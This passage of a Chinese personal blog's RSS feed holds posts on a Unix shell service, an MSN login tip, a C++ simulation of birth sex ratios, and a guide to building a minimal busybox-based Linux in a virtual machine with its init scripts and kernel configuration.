<![CDATA[<P>Unix-Center提供了若干个Linux发行版, 用户可以很方便的切换到不同的发行版, </P>  <P>看一下网络结构: 192.168.2.5是文件服务器, 2.3T的网络存储空间.</P>  <P>ping一下, 发现不同的发行版的ip地址不一致, </P>  <P>ubuntu.unix-center.net的地址是121.194.13.9, 但是ifconfig看到的IP地址是:192.168.1.15, 现在有N个域名,有N个电脑,但是只有一个外网IP, 可否实现根据域名将请求转向不同的内网电脑?</P>  <P><A rel="nofollow" href="mailto:hankjin@ubuntu:~$"  >hankjin@ubuntu:~$</A> df -h<BR>Filesystem&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Size&nbsp; Used Avail Use% Mounted on<BR>/dev/sda1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 144G&nbsp; 5.1G&nbsp; 132G&nbsp;&nbsp; 4% /<BR>varrun&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.0G&nbsp;&nbsp; 68K&nbsp; 4.0G&nbsp;&nbsp; 1% /var/run<BR>varlock&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.0G&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp; 4.0G&nbsp;&nbsp; 0% /var/lock<BR>udev&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.0G&nbsp;&nbsp; 32K&nbsp; 4.0G&nbsp;&nbsp; 1% /dev<BR>devshm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.0G&nbsp;&nbsp;&nbsp;&nbsp; 0&nbsp; 4.0G&nbsp;&nbsp; 0% /dev/shm<BR>lrm&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4.0G&nbsp;&nbsp; 44M&nbsp; 3.9G&nbsp;&nbsp; 2% /lib/modules/2.6.24-22-generic/volatile<BR>192.168.2.5:/store/home<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.3T&nbsp; 293G&nbsp; 1.9T&nbsp; 14% /home<BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720094353421861/</guid>
    </item>
    <item>
      <title>
<![CDATA[MSN不能登陆的原因]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372007869929391/</link>
      <description>
<![CDATA[<P>1。如果在局域网内，可能是网关封端口了</P>
<P>2。今天发现如果IE设置为脱机状态时，MSN也不能登陆。</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Network</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372007869929391/</guid>
    </item>
    <item>
      <title>
<![CDATA[男女比例可以调整吗？]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720109611830647/</link>
      <description>
<![CDATA[按照概率讲，男女比例应该是1:1。<br>受传统思想影响，很多人想要个男孩，于是采取如下策略：<br>如果生的是女孩，就再生一个，直到生的是男孩为止<br>问题来了，如果每个家庭都这样，会不会导致男女比例失调呢？<br>直觉上讲，好像灰常有可能，但是根据概率论的独立事件理论，应该是不会的。<br>用C++的rand函数试一下：这个理论还是靠谱的<br>hankjin@jnfdaj:~$ c++ boygir.cc -o boygirl<br>hankjin@jnfdaj:~$ ./boygirl<br>Boys:100016495<br>Girls: 100000000<br>hankjin@jnfdaj:~$ ./boygirl<br>Boys:99993550<br>Girls: 100000000<br>hankjin@jnfdaj:~$ ./boygirl<br>Boys:100000000<br>Girls: 100012611<br><br>/**<br>* boygirl @ hankjin<br>*/<br>#include &lt;iostream&gt;<br>#include &lt;ctime&gt;<br>#include &lt;cstdlib&gt;<br>using namespace std;<br><br>int main(){<br>&nbsp;&nbsp;&nbsp; long long boy=0, girl=0;<br>&nbsp;&nbsp;&nbsp; int ITER=100000000;<br>&nbsp;&nbsp;&nbsp; srand(time(NULL));<br>&nbsp;&nbsp;&nbsp; for(int i=0;i&lt;ITER;i++){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(rand()%2==0)//一直是女孩<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; girl++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; boy++;//男孩<br>&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;"Boys :"&lt;&lt;boy&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; cout&lt;&lt;"Girls:"&lt;&lt;girl&lt;&lt;endl;<br>&nbsp;&nbsp;&nbsp; return 0;<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720109611830647/</guid>
    </item>
    <item>
      <title>
<![CDATA[使用Ubuntu和虚拟机编译自己的Linux]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200932305433353/</link>
      <description>
<![CDATA[<style>BODY { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
P { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
DIV { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
TD { FONT-FAMILY:Tahoma; FONT-SIZE:10pt }
</style><div>以Ubuntu8.04作为开发机, 以CDLinux0.9.2.iso作为光驱的虚拟机作为目标机<br>第一步: 创建虚拟机, <br>文件-&gt;新建-&gt;虚拟机-&gt;自定义-&gt;其它(Others)-&gt;使用桥接网络-&gt;虚拟磁盘类型SCSI<br><br>第二部: 在Ubuntu开发机上编译2.6.21的内核<br>下载2.6.21的内核, 解压缩, 然后把本文后面的2.6.21.config 拷贝到内核代码目录下, 改名为.config 然后<br></div>
<div>make menuconfig<br>#虚拟机下运行, 还需要增加BUSLOGIC模块, 否则会出现不能加载VFS的错误<br>#选中Device Drivers-&gt;SCSI Device Support-&gt;SCSI low-level drivers-&gt;BusLogic SCSI Support<br>#虚拟机网卡 AMD pcnet32<br>#选中Device Drivers-&gt;Network Device Support-&gt;Ethernet (10 or 100Mbit)-&gt;AMD PCnet32 PCI support<br>vi Makefile<br>#gcc-4.3太新, 需要修改makefile, 或者用比较旧的gcc<br>#CFLAGS := -Wall -Wundef -Wstrct-prototypes -Wno-trigraphs<br># &nbsp;&nbsp; -fno-strict-aliasing -fno-common <span style="color: rgb(255, 0, 0);">\</span><br>#&nbsp;&nbsp;&nbsp; <span style="color: rgb(255, 0, 0);">-fno -tree-scev-cprop</span><br>#<br>vi scripts/mod/sumversion.c<br>#添加 #include <limits.h><br></limits.h></div>

<div>make<br>cp arch/i386/boot/bzImage /home/hank/install/vmlinux<br><br></div>
<div>第三步: 编译1.5.1的busybox<br>下载1.5.1的busybox源代码,解压缩, 然后把本文后面的1.5.1.config拷贝到源代码目录下,改名为.config<br></div>
<div>make</div>
<div>make install<br>cd _install<br>tar zcvf busybox.tar.gz *<br>cp busybox.tar.gz /home/hank/install/busybox.tar.gz<br>第四步: 准备启动脚本<br>将本文后面的inittab rcS fstab passwd shadow group保存到/home/hank/install/etc目录下<br><br></div>
<div>第五步: 安装<br>用WinPE光盘启动, 用WinPM分为两个区, 第一个FAT32,3G,第二个Ext2, 然后在FAT32上安装grub4dos<br>用CDLinux的光盘启动, 然后挂载分区<br>mkdir /mnt/usb<br>mount /dev/sda2 /mnt/usb<br>#在CDLinux下配置网络<br>ifconfig eth0 192.201.0.67 netmask 255.255.255.0<br>#将前面编译好的内核和busybox, 以及本文后面的若干启动脚本, 拷贝到目标机<br>cd /mnt/usb<br>scp -r hank@192.201.0.111:/home/hank/u/install .<br></div>
<div><font face="monospace">mkdir /mnt/usb/{bin,boot,etc,home,sbin,tmp,var,proc,sys,root,dev}<br>mkdir /mnt/usb/etc/init.d<br>mkdir /mnt/usb/var/{run,log}<br>chmod 1777 /mnt/usb/tmp<br>touch /mnt/usb/var/log/{lastlog,wtmp}<br>chgrp utmp /mnt/usb/var/log/{lastlog,wtmp}<br>chmod 664 /mnt/usb/var/log/lastlog<br>#copy kernel<br>cp /mnt/usb/install/vmlinux /mnt/usb/boot/vmlinux</font></div>
<div><font face="monospace">#copy busybox<br>tar xf /mnt/usb/install/busybox.tar.gz -C /mnt/usb<br>chown -R 0.0 /mnt/usb/{bin,sbin,linuxrc}<br>mknod -m 600 /mnt/usb/dev/console c 5 1</font></div>
<div><font face="monospace">#copy etcs<br>cp /mnt/usb/install/etc/* /mnt/usb/etc/<br>chmod 755 /mnt/usb/etc/*<br>mv /mnt/usb/etc/rcS /mnt/usb/etc/init.d/rcS<br><br>第六步启动:<br>重启虚拟机, 在grub下,按c进入grub命令行<br>root (hd0,1)<br>kernel /boot/vmlinx root=/dev/sda2 rw rootdelay=10 vga=788<br>boot<br><br>第七部 移植软件<br>在开发机上获取lua的源代码<br>sudo apt-get source lua5.1<br>cd lua5.1-5.1.3/src<br>sudo vi Makefile<br>#cc = gcc <span style="color: rgb(255, 0, 0);">-static</span><br>sudo make<br>然后把生成的lua拷贝到web目录下<br>在目标机上下载:<br>ifconfig eth0 192.201.0.67 netmask 255.255.255.0<br>wget http://192.201.0.111/~hank/lua<br>chmod +x lua<br>./lua<br>移植锐捷官方认证软件<br>在开发机上<br>下载源代码,解压缩 <br></font><font face="monospace"> wget http://newhost.byhh.net/f/Linux/1187005475/mystar.tar.bz2<br>tar xf mystar.tar.gz<br>安装类库开发包<br>sudo apt-get install libpcap0.8-dev<br>sudo apt-get install libnet1-dev<br>修改编译选项,改为静态编译<br>cd mystar<br>vi Makefile<br>#cc=gcc <span style="color: rgb(255, 0, 0);">-static</span><br></font><font face="monospace">make<br>同样的方法把生成的mystar和mystar.conf拷贝到目标机上, 并分别放到/bin和/etc目录下<br></font></div>
<div>&nbsp;</div>
<div>附1: /etc/inittab</div>
<div><font face="monospace">::sysinit:/etc/init.d/rcS<br>tty1::respawn:/sbin/getty 38400 tty1<br>tty2::respawn:/sbin/getty 38400 tty2<br>tty3::respawn:/sbin/getty 38400 tty3<br>tty4::respawn:/sbin/getty 38400 tty4<br>tty5::respawn:/sbin/getty 38400 tty5<br>tty6::respawn:/sbin/getty 38400 tty6<br>::restart:/sbin/init<br>::ctrlaltdel:/sbin/reboot<br>::shutdown:/bin/umount -a -r<br>::shutdown:/sbin/swapoff -a</font></div>
<div>&nbsp;</div>
<div>附2: /etc/init.d/rcS</div>
<div><font face="monospace">#!/bin/sh<br>PATH=/bin:/sbin<br>mount -a<br>mount -t tmpfs mdev /dev<br>mkdir /dev/pts<br>mount -t devpts devpts /dev/pts<br>mknod -m 600 /dev/console c 5 1<br>mknod -m 777 /dev/null c 1 3<br>mknod -m 666 /dev/zero c 1 5<br>mknod -m 666 /dev/tty c 5 0<br>for i in 0 1 2 3 4 5 6 7 8 9 10 11 12<br>do<br>mknod -m 600 /dev/tty$i c 4 $i<br>done<br>echo /sbin/mdev &gt; /proc/sys/kernel/hotplug<br>mdev -s<br>hostname -F /etc/hostname<br>syslogd<br>klogd</font></div>
<div>&nbsp;</div>
<div>附3 /etc/fstab</div>
<div><font face="monospace">proc /proc proc defaults 0 0<br>sysfs /sys sysfs defaults 0 0</font></div>
<div>&nbsp;</div>



<div>附4 /etc/passwd<br>root:x:0:0:root:/root:/bin/sh<br>bin:x:2:2:bin:/bin:/bin/sh<br>sys:x:3:3:sys:/dev:/bin/sh<br>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br><br>附5 /etc/shadow<br>root::12886:0:99999:7:::<br>bin:*:12886:0:99999:7:::<br>sys:*:12886:0:99999:7:::<br>nobody:*:12886:0:99999:7:::<br><br>附5.1 /etc/group<br>root:x:0:<br>bin:x:2:<br>sys:x:3:<br>adm:x:4:<br>tty:x:5:<br>disk:x:6:<br>utmp:x:43:<br>users:x:100:<br>nogroup:x:65534:<br><br>附5.2 /etc/hostname<br>iLinux<br><br>附6 2.6.21.config<br></div>
<div>CONFIG_X86_32=y</div>
<div>CONFIG_GENERIC_TIME=y</div>
<div>CONFIG_CLOCKSOURCE_WATCHDOG=y</div>
<div>CONFIG_GENERIC_CLOCKEVENTS=y</div>
<div>CONFIG_GENERIC_CLOCKEVENTS_BROADCAST=y</div>
<div>CONFIG_LOCKDEP_SUPPORT=y</div>
<div>CONFIG_STACKTRACE_SUPPORT=y</div>
<div>CONFIG_SEMAPHORE_SLEEPERS=y</div>
<div>CONFIG_X86=y</div>
<div>CONFIG_MMU=y</div>
<div>CONFIG_ZONE_DMA=y</div>
<div>CONFIG_GENERIC_ISA_DMA=y</div>
<div>CONFIG_GENERIC_IOMAP=y</div>
<div>CONFIG_GENERIC_BUG=y</div>
<div>CONFIG_GENERIC_HWEIGHT=y</div>
<div>CONFIG_ARCH_MAY_HAVE_PC_FDC=y</div>
<div>CONFIG_DMI=y</div>
<div>CONFIG_DEFCONFIG_LIST="/lib/modules/$UNAME_RELEASE/.config"</div>
<div>CONFIG_LOCK_KERNEL=y</div>
<div>CONFIG_INIT_ENV_ARG_LIMIT=32</div>
<div>CONFIG_LOCALVERSION=""</div>
<div>CONFIG_SWAP=y</div>
<div>CONFIG_BSD_PROCESS_ACCT=y</div>
<div>CONFIG_SYSCTL=y</div>
<div>CONFIG_UID16=y</div>
<div>CONFIG_SYSCTL_SYSCALL=y</div>
<div>CONFIG_KALLSYMS=y</div>
<div>CONFIG_HOTPLUG=y</div>
<div>CONFIG_PRINTK=y</div>
<div>CONFIG_BUG=y</div>
<div>CONFIG_ELF_CORE=y</div>
<div>CONFIG_BASE_FULL=y</div>
<div>CONFIG_FUTEX=y</div>
<div>CONFIG_EPOLL=y</div>
<div>CONFIG_SHMEM=y</div>
<div>CONFIG_SLAB=y</div>
<div>CONFIG_VM_EVENT_COUNTERS=y</div>
<div>CONFIG_RT_MUTEXES=y</div>
<div>CONFIG_BASE_SMALL=0</div>
<div>CONFIG_BLOCK=y</div>
<div>CONFIG_IOSCHED_NOOP=y</div>
<div>CONFIG_IOSCHED_AS=y</div>
<div>CONFIG_IOSCHED_DEADLINE=y</div>
<div>CONFIG_IOSCHED_CFQ=y</div>
<div>CONFIG_DEFAULT_CFQ=y</div>
<div>CONFIG_DEFAULT_IOSCHED="cfq"</div>
<div>CONFIG_TICK_ONESHOT=y</div>
<div>CONFIG_NO_HZ=y</div>
<div>CONFIG_SMP=y</div>
<div>CONFIG_X86_PC=y</div>
<div>CONFIG_MPENTIUM4=y</div>
<div>CONFIG_X86_CMPXCHG=y</div>
<div>CONFIG_X86_L1_CACHE_SHIFT=7</div>
<div>CONFIG_RWSEM_XCHGADD_ALGORITHM=y</div>
<div>CONFIG_GENERIC_CALIBRATE_DELAY=y</div>
<div>CONFIG_X86_WP_WORKS_OK=y</div>
<div>CONFIG_X86_INVLPG=y</div>
<div>CONFIG_X86_BSWAP=y</div>
<div>CONFIG_X86_POPAD_OK=y</div>
<div>CONFIG_X86_CMPXCHG64=y</div>
<div>CONFIG_X86_GOOD_APIC=y</div>
<div>CONFIG_X86_INTEL_USERCOPY=y</div>
<div>CONFIG_X86_USE_PPRO_CHECKSUM=y</div>
<div>CONFIG_X86_TSC=y</div>
<div>CONFIG_HPET_TIMER=y</div>
<div>CONFIG_HPET_EMULATE_RTC=y</div>
<div>CONFIG_NR_CPUS=8</div>
<div>CONFIG_PREEMPT_VOLUNTARY=y</div>
<div>CONFIG_PREEMPT_BKL=y</div>
<div>CONFIG_X86_LOCAL_APIC=y</div>
<div>CONFIG_X86_IO_APIC=y</div>
<div>CONFIG_X86_MCE=y</div>
<div>CONFIG_VM86=y</div>
<div>CONFIG_EDD=y</div>
<div>CONFIG_HIGHMEM4G=y</div>
<div>CONFIG_PAGE_OFFSET=0xC0000000</div>
<div>CONFIG_HIGHMEM=y</div>
<div>CONFIG_ARCH_POPULATES_NODE_MAP=y</div>
<div>CONFIG_FLATMEM=y</div>
<div>CONFIG_FLAT_NODE_MEM_MAP=y</div>
<div>CONFIG_SPLIT_PTLOCK_CPUS=4</div>
<div>CONFIG_ZONE_DMA_FLAG=1</div>
<div>CONFIG_MTRR=y</div>
<div>CONFIG_SECCOMP=y</div>
<div>CONFIG_HZ_1000=y</div>
<div>CONFIG_HZ=1000</div>
<div>CONFIG_PHYSICAL_START=0x100000</div>
<div>CONFIG_PHYSICAL_ALIGN=0x100000</div>
<div>CONFIG_COMPAT_VDSO=y</div>
<div>CONFIG_ARCH_ENABLE_MEMORY_HOTPLUG=y</div>
<div>CONFIG_PCI=y</div>
<div>CONFIG_PCI_GOANY=y</div>
<div>CONFIG_PCI_BIOS=y</div>
<div>CONFIG_PCI_DIRECT=y</div>
<div>CONFIG_PCIEPORTBUS=y</div>
<div>CONFIG_HT_IRQ=y</div>
<div>CONFIG_ISA_DMA_API=y</div>
<div>CONFIG_BINFMT_ELF=y</div>
<div>CONFIG_BINFMT_MISC=y</div>
<div>CONFIG_NET=y</div>
<div>CONFIG_PACKET=y</div>
<div>CONFIG_PACKET_MMAP=y</div>
<div>CONFIG_UNIX=y</div>
<div>CONFIG_INET=y</div>
<div>CONFIG_IP_FIB_HASH=y</div>
<div>CONFIG_SYN_COOKIES=y</div>
<div>CONFIG_INET_DIAG=y</div>
<div>CONFIG_INET_TCP_DIAG=y</div>
<div>CONFIG_TCP_CONG_CUBIC=y</div>
<div>CONFIG_DEFAULT_TCP_CONG="cubic"</div>
<div>CONFIG_STANDALONE=y</div>
<div>CONFIG_PREVENT_FIRMWARE_BUILD=y</div>
<div>CONFIG_FW_LOADER=y</div>
<div>CONFIG_CONNECTOR=y</div>
<div>CONFIG_PROC_EVENTS=y</div>
<div>CONFIG_BLK_DEV_FD=y</div>
<div>CONFIG_BLK_DEV_LOOP=y</div>
<div>CONFIG_BLK_DEV_CRYPTOLOOP=y</div>
<div>CONFIG_BLK_DEV_RAM=y</div>
<div>CONFIG_BLK_DEV_RAM_COUNT=16</div>
<div>CONFIG_BLK_DEV_RAM_SIZE=8192</div>
<div>CONFIG_BLK_DEV_RAM_BLOCKSIZE=1024</div>
<div>CONFIG_IDE=y</div>
<div>CONFIG_BLK_DEV_IDE=y</div>
<div>CONFIG_BLK_DEV_IDEDISK=y</div>
<div>CONFIG_BLK_DEV_IDECD=y</div>
<div>CONFIG_BLK_DEV_IDEFLOPPY=y</div>
<div>CONFIG_IDE_GENERIC=y</div>
<div>CONFIG_BLK_DEV_IDEPCI=y</div>
<div>CONFIG_IDEPCI_SHARE_IRQ=y</div>
<div>CONFIG_BLK_DEV_GENERIC=y</div>
<div>CONFIG_BLK_DEV_IDEDMA_PCI=y</div>
<div>CONFIG_BLK_DEV_IDEDMA=y</div>
<div>CONFIG_SCSI=y</div>
<div>CONFIG_SCSI_PROC_FS=y</div>
<div>CONFIG_BLK_DEV_SD=y</div>
<div>CONFIG_BLK_DEV_SR=y</div>
<div>CONFIG_SCSI_ISCSI_ATTRS=y</div>
<div>CONFIG_ATA=y</div>
<div>CONFIG_ATA_GENERIC=y</div>
<div>CONFIG_NETDEVICES=y</div>
<div>CONFIG_TUN=y</div>
<div>CONFIG_NET_ETHERNET=y</div>
<div>CONFIG_MII=y</div>
<div>CONFIG_NET_VENDOR_3COM=y</div>
<div>CONFIG_VORTEX=y</div>
<div>CONFIG_TYPHOON=y</div>
<div>CONFIG_NET_PCI=y</div>
<div>CONFIG_EEPRO100=y</div>
<div>CONFIG_E100=y</div>
<div>CONFIG_8139TOO=y</div>
<div>CONFIG_8139TOO_PIO=y</div>
<div>CONFIG_8139TOO_TUNE_TWISTER=y</div>
<div>CONFIG_E1000=y</div>
<div>CONFIG_R8169=y</div>
<div>CONFIG_TIGON3=y</div>
<div>CONFIG_IXGB=y</div>
<div>CONFIG_WAN=y</div>
<div>CONFIG_LANMEDIA=y</div>
<div>CONFIG_HDLC=y</div>
<div>CONFIG_HDLC_RAW=y</div>
<div>CONFIG_HDLC_RAW_ETH=y</div>
<div>CONFIG_HDLC_CISCO=y</div>
<div>CONFIG_HDLC_FR=y</div>
<div>CONFIG_HDLC_PPP=y</div>
<div>CONFIG_PCI200SYN=y</div>
<div>CONFIG_WANXL=y</div>
<div>CONFIG_PC300=y</div>
<div>CONFIG_FARSYNC=y</div>
<div>CONFIG_DLCI=y</div>
<div>CONFIG_DLCI_MAX=8</div>
<div>CONFIG_SBNI=y</div>
<div>CONFIG_INPUT=y</div>
<div>CONFIG_INPUT_MOUSEDEV=y</div>
<div>CONFIG_INPUT_MOUSEDEV_PSAUX=y</div>
<div>CONFIG_INPUT_MOUSEDEV_SCREEN_X=1024</div>
<div>CONFIG_INPUT_MOUSEDEV_SCREEN_Y=768</div>
<div>CONFIG_INPUT_KEYBOARD=y</div>
<div>CONFIG_KEYBOARD_ATKBD=y</div>
<div>CONFIG_KEYBOARD_SUNKBD=y</div>
<div>CONFIG_KEYBOARD_LKKBD=y</div>
<div>CONFIG_KEYBOARD_XTKBD=y</div>
<div>CONFIG_KEYBOARD_NEWTON=y</div>
<div>CONFIG_INPUT_MOUSE=y</div>
<div>CONFIG_MOUSE_PS2=y</div>
<div>CONFIG_SERIO=y</div>
<div>CONFIG_SERIO_I8042=y</div>
<div>CONFIG_SERIO_LIBPS2=y</div>
<div>CONFIG_VT=y</div>
<div>CONFIG_VT_CONSOLE=y</div>
<div>CONFIG_HW_CONSOLE=y</div>
<div>CONFIG_UNIX98_PTYS=y</div>
<div>CONFIG_LEGACY_PTYS=y</div>
<div>CONFIG_LEGACY_PTY_COUNT=256</div>
<div>CONFIG_NVRAM=y</div>
<div>CONFIG_RTC=y</div>
<div>CONFIG_AGP=y</div>
<div>CONFIG_FB=y</div>
<div>CONFIG_FB_CFB_FILLRECT=y</div>
<div>CONFIG_FB_CFB_COPYAREA=y</div>
<div>CONFIG_FB_CFB_IMAGEBLIT=y</div>
<div>CONFIG_FB_VESA=y</div>
<div>CONFIG_VGA_CONSOLE=y</div>
<div>CONFIG_VIDEO_SELECT=y</div>
<div>CONFIG_DUMMY_CONSOLE=y</div>
<div>CONFIG_FRAMEBUFFER_CONSOLE=y</div>
<div>CONFIG_FRAMEBUFFER_CONSOLE_ROTATION=y</div>
<div>CONFIG_FONTS=y</div>
<div>CONFIG_FONT_8x8=y</div>
<div>CONFIG_FONT_8x16=y</div>
<div>CONFIG_HID=y</div>
<div>CONFIG_USB_ARCH_HAS_HCD=y</div>
<div>CONFIG_USB_ARCH_HAS_OHCI=y</div>
<div>CONFIG_USB_ARCH_HAS_EHCI=y</div>
<div>CONFIG_USB=y</div>
<div>CONFIG_USB_DEVICEFS=y</div>
<div>CONFIG_USB_EHCI_HCD=y</div>
<div>CONFIG_USB_OHCI_HCD=y</div>
<div>CONFIG_USB_OHCI_LITTLE_ENDIAN=y</div>
<div>CONFIG_USB_UHCI_HCD=y</div>
<div>CONFIG_USB_STORAGE=y</div>
<div>CONFIG_USB_HID=y</div>
<div>CONFIG_EXT2_FS=y</div>
<div>CONFIG_EXT2_FS_XATTR=y</div>
<div>CONFIG_EXT2_FS_POSIX_ACL=y</div>
<div>CONFIG_EXT2_FS_SECURITY=y</div>
<div>CONFIG_EXT3_FS=y</div>
<div>CONFIG_EXT3_FS_XATTR=y</div>
<div>CONFIG_EXT3_FS_POSIX_ACL=y</div>
<div>CONFIG_EXT3_FS_SECURITY=y</div>
<div>CONFIG_JBD=y</div>
<div>CONFIG_FS_MBCACHE=y</div>
<div>CONFIG_REISERFS_FS=y</div>
<div>CONFIG_REISERFS_PROC_INFO=y</div>
<div>CONFIG_REISERFS_FS_XATTR=y</div>
<div>CONFIG_REISERFS_FS_POSIX_ACL=y</div>
<div>CONFIG_REISERFS_FS_SECURITY=y</div>
<div>CONFIG_FS_POSIX_ACL=y</div>
<div>CONFIG_ROMFS_FS=y</div>
<div>CONFIG_INOTIFY=y</div>
<div>CONFIG_INOTIFY_USER=y</div>
<div>CONFIG_DNOTIFY=y</div>
<div>CONFIG_FUSE_FS=y</div>
<div>CONFIG_ISO9660_FS=y</div>
<div>CONFIG_JOLIET=y</div>
<div>CONFIG_ZISOFS=y</div>
<div>CONFIG_UDF_FS=y</div>
<div>CONFIG_UDF_NLS=y</div>
<div>CONFIG_FAT_FS=y</div>
<div>CONFIG_MSDOS_FS=y</div>
<div>CONFIG_VFAT_FS=y</div>
<div>CONFIG_FAT_DEFAULT_CODEPAGE=437</div>
<div>CONFIG_FAT_DEFAULT_IOCHARSET="iso8859-1"</div>
<div>CONFIG_NTFS_FS=y</div>
<div>CONFIG_PROC_FS=y</div>
<div>CONFIG_PROC_SYSCTL=y</div>
<div>CONFIG_SYSFS=y</div>
<div>CONFIG_TMPFS=y</div>
<div>CONFIG_RAMFS=y</div>
<div>CONFIG_MSDOS_PARTITION=y</div>
<div>CONFIG_NLS=y</div>
<div>CONFIG_NLS_DEFAULT="iso8859-1"</div>
<div>CONFIG_NLS_CODEPAGE_437=y</div>
<div>CONFIG_NLS_CODEPAGE_936=y</div>
<div>CONFIG_NLS_CODEPAGE_950=y</div>
<div>CONFIG_NLS_ASCII=y</div>
<div>CONFIG_NLS_ISO8859_1=y</div>
<div>CONFIG_NLS_ISO8859_15=y</div>
<div>CONFIG_NLS_UTF8=y</div>
<div>CONFIG_TRACE_IRQFLAGS_SUPPORT=y</div>
<div>CONFIG_LOG_BUF_SHIFT=15</div>
<div>CONFIG_DEBUG_BUGVERBOSE=y</div>
<div>CONFIG_EARLY_PRINTK=y</div>
<div>CONFIG_X86_FIND_SMP_CONFIG=y</div>
<div>CONFIG_X86_MPPARSE=y</div>
<div>CONFIG_DOUBLEFAULT=y</div>
<div>CONFIG_CRYPTO=y</div>
<div>CONFIG_CRYPTO_ALGAPI=y</div>
<div>CONFIG_CRYPTO_BLKCIPHER=y</div>
<div>CONFIG_CRYPTO_MANAGER=y</div>
<div>CONFIG_CRYPTO_CBC=y</div>
<div>CONFIG_BITREVERSE=y</div>
<div>CONFIG_CRC32=y</div>
<div>CONFIG_ZLIB_INFLATE=y</div>
<div>CONFIG_PLIST=y</div>
<div>CONFIG_HAS_IOMEM=y</div>
<div>CONFIG_HAS_IOPORT=y</div>
<div>CONFIG_GENERIC_HARDIRQS=y</div>
<div>CONFIG_GENERIC_IRQ_PROBE=y</div>
<div>CONFIG_GENERIC_PENDING_IRQ=y</div>
<div>CONFIG_X86_SMP=y</div>
<div>CONFIG_X86_HT=y</div>
<div>CONFIG_X86_BIOS_REBOOT=y</div>
<div>CONFIG_X86_TRAMPOLINE=y</div>
<div>CONFIG_KTIME_SCALAR=y</div>
<div>&nbsp;</div>&nbsp;
<div>附7 busybox的配置文件(1.5.1) 1.5.1.config<br></div>
<div>&nbsp;</div>
<div>CONFIG_HAVE_DOT_CONFIG=y</div>
<div>CONFIG_SHOW_USAGE=y</div>
<div>CONFIG_FEATURE_VERBOSE_USAGE=y</div>
<div>CONFIG_FEATURE_COMPRESS_USAGE=y</div>
<div>CONFIG_GETOPT_LONG=y</div>
<div>CONFIG_FEATURE_SUID=y</div>
<div>CONFIG_FEATURE_SYSLOG=y</div>
<div>CONFIG_BUSYBOX_EXEC_PATH="/bin/busybox"</div>
<div>CONFIG_STATIC=y</div>
<div>CONFIG_LFS=y</div>
<div>CONFIG_INSTALL_NO_USR=y</div>
<div>CONFIG_INSTALL_APPLET_SYMLINKS=y</div>
<div>CONFIG_PREFIX="./_install"</div>
<div>CONFIG_PASSWORD_MINLEN=6</div>
<div>CONFIG_MD5_SIZE_VS_SPEED=2</div>
<div>CONFIG_FEATURE_EDITING=y</div>
<div>CONFIG_FEATURE_EDITING_HISTORY=15</div>
<div>CONFIG_FEATURE_TAB_COMPLETION=y</div>
<div>CONFIG_FEATURE_EDITING_FANCY_PROMPT=y</div>
<div>CONFIG_AR=y</div>
<div>CONFIG_FEATURE_AR_LONG_FILENAMES=y</div>
<div>CONFIG_BUNZIP2=y</div>
<div>CONFIG_CPIO=y</div>
<div>CONFIG_DPKG=y</div>
<div>CONFIG_DPKG_DEB=y</div>
<div>CONFIG_GUNZIP=y</div>
<div>CONFIG_FEATURE_GUNZIP_UNCOMPRESS=y</div>
<div>CONFIG_GZIP=y</div>
<div>CONFIG_TAR=y</div>
<div>CONFIG_FEATURE_TAR_CREATE=y</div>
<div>CONFIG_FEATURE_TAR_BZIP2=y</div>
<div>CONFIG_FEATURE_TAR_GZIP=y</div>
<div>CONFIG_FEATURE_TAR_GNU_EXTENSIONS=y</div>
<div>CONFIG_FEATURE_TAR_LONG_OPTIONS=y</div>
<div>CONFIG_UNLZMA=y</div>
<div>CONFIG_UNZIP=y</div>
<div>CONFIG_FEATURE_DEB_TAR_GZ=y</div>
<div>CONFIG_FEATURE_DEB_TAR_BZ2=y</div>
<div>CONFIG_BASENAME=y</div>
<div>CONFIG_CAT=y</div>
<div>CONFIG_CHGRP=y</div>
